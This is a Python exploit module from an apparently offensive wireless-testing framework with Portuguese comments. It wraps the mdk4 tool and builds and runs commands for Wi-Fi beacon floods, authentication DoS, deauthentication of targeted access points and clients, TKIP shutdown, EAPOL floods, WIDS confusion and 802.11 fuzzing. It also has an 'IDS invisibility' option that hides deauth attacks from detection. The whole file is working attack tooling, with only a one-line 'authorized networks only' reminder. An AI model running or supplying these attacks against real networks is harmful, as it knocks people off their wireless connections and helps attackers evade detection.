#!/usr/bin/env python3
# Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
"""Bridge subprocess para mdk4 (GPL-3.0): flood de beacons, DoS de autenticação, brute de
probe/SSID, deauth, shutdown Michael (TKIP), flood EAPOL start/logoff, confusão WIDS e fuzzer
802.11. Requer ``mdk4`` no PATH ou clone local; interface em modo monitor.

Improvements from upstream aircrack-ng/mdk4 issues:
  - IDS invisibility mode with sequence matching (issue #124)
  - PMF-aware deauth notes (issue #123)
  - Deauth speed tuning documentation (issue #105)
  - Mesh network mode guidance (issue #116)

Version: 1.2.0
"""
from __future__ import annotations

import logging, os, shutil, subprocess
from pathlib import Path
from typing import List, Optional

from wirelessxpl.core.exploit import *

logger = logging.getLogger(__name__)

_VALID_MODES = frozenset("bapdmewfsx")


class Exploit(Exploit):
    """Ponte subprocess para mdk4 (GPL-3.0) com modos b/a/p/d/m/e/w/f/s/x."""

    __info__ = {
        "name": "mdk4 Bridge",
        "description": (
            "Invoca mdk4 (GPL-3.0) como subprocesso: beacon flood (b), auth DoS (a), "
            "probe/SSID bruteforce (p), deauth (d), Michael TKIP shutdown (m), "
            "EAPOL start/logoff flood (e), WIDS confusion (w), 802.11 fuzzer (f), "
            "802.11s mesh (s), PoC / 802.1X (x). Não inclui o binário mdk4."
        ),
        "authors": (
            "André Henrique (@mrhenrike) | União Geek",
            "mdk4 contributors (GPL-3.0, invoked as subprocess)",
        ),
        "references": (
            "https://github.com/aircrack-ng/mdk4",
            "https://www.kali.org/tools/mdk4/",
        ),
        "devices": ("wifi",),
    }

    interface = OptString("", "Interface Wi-Fi (modo monitor)")
    mode = OptString(
        "b",
        "Modo: b|a|p|d|m|e|w|f|s|x|mesh (mesh = alias para s)",
    )
    target_bssid = OptMAC("", "BSSID alvo (ex.: deauth: -B; auth DoS: -a)")
    target_client = OptMAC("", "MAC estação alvo (ex.: deauth: -S)")
    channel = OptString("", "Canal ou hopping (-c), ex.: 6 ou h")
    speed = OptString("", "Pacotes/segundo (-s)")
    whitelist_file = OptString("", "Arquivo whitelist (-w), típico no modo d")
    blacklist_file = OptString("", "Arquivo blacklist (-b), típico no modo d")
    ids_stealth = OptBool(False, "IDS invisibility: match sequence numbers with -x (mode d)")
    dry_run = OptBool(False, "Somente exibir o comando")

    def _find_mdk4(self) -> Optional[str]:
        """Localiza o executável ``mdk4``."""
        found = shutil.which("mdk4")
        if found:
            return found
        guess = (
            Path(__file__).resolve().parents[5]
            / "submodules"
            / "IoT"
            / "mdk4"
            / "src"
            / "mdk4"
        )
        if guess.is_file():
            return str(guess)
        return None

    def _build_command(self, mdk4_bin: str) -> List[str]:
        """Monta a linha de comando mdk4 a partir das opções.

        Returns:
            Lista de argumentos (sem ``sudo``).

        Raises:
            ValueError: Parâmetros inválidos.
        """
        iface = str(self.interface).strip()
        if not iface:
            raise ValueError("Defina interface (modo monitor).")

        mode = str(self.mode).strip().lower()
        if mode == "mesh":
            mode = "s"
        if len(mode) != 1 or mode not in _VALID_MODES:
            raise ValueError(
                "mode deve ser um de: {}.".format(", ".join(sorted(_VALID_MODES))),
            )

        cmd: List[str] = [mdk4_bin, iface, mode]

        ch = str(self.channel).strip()
        if ch:
            cmd.extend(["-c", ch])

        rate = str(self.speed).strip()
        if rate:
            cmd.extend(["-s", rate])

        tb = str(self.target_bssid).strip()
        if tb:
            if mode == "a":
                cmd.extend(["-a", tb])
            else:
                cmd.extend(["-B", tb])

        tc = str(self.target_client).strip()
        if tc:
            cmd.extend(["-S", tc])

        if mode == "d":
            wf = str(self.whitelist_file).strip()
            if wf:
                if not os.path.isfile(wf):
                    raise ValueError("whitelist_file inexistente: {}".format(wf))
                cmd.extend(["-w", wf])
            bf = str(self.blacklist_file).strip()
            if bf:
                if not os.path.isfile(bf):
                    raise ValueError("blacklist_file inexistente: {}".format(bf))
                cmd.extend(["-b", bf])
            if self.ids_stealth:
                cmd.append("-x")
        else:
            wf = str(self.whitelist_file).strip()
            bf = str(self.blacklist_file).strip()
            if wf or bf:
                logger.warning(
                    "whitelist_file/blacklist_file ignorados fora do modo d "
                    "(no mdk4, -w/-b têm outros significados em outros modos).",
                )

        return cmd


    def check(self) -> str:
        """Verify external tool dependencies are installed."""
        import shutil
        tools: list[str] = []
        src = getattr(self.__class__, "__doc__", "") or ""
        for t in ("aircrack-ng", "airodump-ng", "aireplay-ng", "airmon-ng",
                   "hashcat", "hcxdumptool", "hcxtools", "wifite", "bettercap",
                   "kismet", "hostapd", "dnsmasq", "mdk4", "mdk3",
                   "hostapd-wpe", "hostapd-mana", "eaphammer"):
            if t.replace("-ng", "").replace("-", "") in (src + self.__class__.__name__).lower():
                tools.append(t)
        if not tools:
            tools = ["aircrack-ng"]
        missing = [t for t in tools if not shutil.which(t.rstrip("_"))]
        if missing:
            return f"Missing tools: {', '.join(missing)} - install before use"
        return f"Tool dependencies found: {', '.join(tools)} - prerequisites OK"

    def run(self) -> None:
        """Executa mdk4 ou exibe o comando em dry_run."""
        mdk4_bin = self._find_mdk4()
        if not mdk4_bin:
            print_error(
                "mdk4 não encontrado. Instale o pacote (ex.: apt install mdk4) ou "
                "clone o projeto e compile.",
            )
            return

        try:
            cmd = self._build_command(mdk4_bin)
        except ValueError as err:
            print_error(str(err))
            return

        full_cmd = ["sudo"] + cmd
        cmd_str = " ".join(full_cmd)

        if self.dry_run:
            print_info("DRY RUN — comando:")
            print_status(cmd_str)
            return

        print_status("mdk4 (modo {}): {}".format(self.mode, cmd_str))
        print_info("Ferramenta agressiva — use apenas em redes autorizadas.")
        try:
            subprocess.run(full_cmd, check=False)
        except KeyboardInterrupt:
            print_info("mdk4 interrompido pelo usuário.")
        except Exception as err:
            print_error("Falha ao executar mdk4: {}".format(err))
